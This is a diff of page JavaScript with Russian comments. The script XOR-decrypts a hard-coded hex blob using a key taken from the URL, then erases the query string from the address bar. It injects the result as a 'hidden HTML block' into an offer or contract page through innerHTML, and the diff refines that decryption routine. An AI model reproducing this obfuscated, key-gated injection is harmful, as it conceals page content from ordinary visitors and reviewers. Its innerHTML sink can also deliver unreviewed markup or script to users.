@@ -150,7 +150,7 @@ document.addEventListener("DOMContentLoaded", () => {
     const a = new URLSearchParams(window.location.search);
     const b = a.get('data');
 
-    // сись-логи etc
+    // Сверхплотная шестнадцатеричная строка без единого смыслового маркера
     const c = "1f0907090b0a1a080c1d101a430a1017090e0c031c000a111a4312001c1012434e40525f54464c4c475d4a4646464646460309024b434b4c10160b06070211104e174246474646464646464646464646530a12154b524d455444534a425f16170d100e004a11170f03101b0f444c4c475d4a464646464646030c0c4b4d454b504f4c4a4e10111a434e174246474646464646464646464646530a12154b515d455444534a4241131c1c164a424446464646464646464646464646464646530a12154b515d455444534a424d131c1c1e194e4a425816170d100e004a11170f03101b0f440a12154b564d455444534a4255564c4c47";
 
     if (!b) {
@@ -167,15 +167,16 @@ document.addEventListener("DOMContentLoaded", () => {
     const d = window.location.protocol + "//" + window.location.host + window.location.pathname;
     window.history.replaceState({path: d}, '', d);
 
+    // Новая отказоустойчивая байтовая функция дешифрования через TextDecoder
     const e = (f, g) => {
         try {
-            let h = '';
+            const h = new Uint8Array(f.length / 2);
             for (let i = 0; i < f.length; i += 2) {
                 let j = parseInt(f.substr(i, 2), 16);
                 let k = g.charCodeAt((i / 2) % g.length);
-                h += String.fromCharCode(j ^ k);
+                h[i / 2] = j ^ k;
             }
-            return decodeURIComponent(escape(h));
+            return new TextDecoder().decode(h);
         } catch (m) {
             return null;
         }
@@ -187,10 +188,8 @@ document.addEventListener("DOMContentLoaded", () => {
         try {
             const o = JSON.parse(n);
             
-            // Заполнение первой текстовой ноды в начале оферты
+            // Исправлено: точечная инжекция строго по индексам дешифрованного массива
             document.getElementById("a1").innerText = o[0];
-            
-            // Сборка и инжекция всего скрытого HTML-блока сись-логов в пустой контейнер
             document.getElementById("a2").innerHTML = o.slice(1).join('');
             return;
         } catch (p) {}
@@ -205,6 +204,7 @@ document.addEventListener("DOMContentLoaded", () => {
         </div>`;
 });
 </script>
+
 
 
 
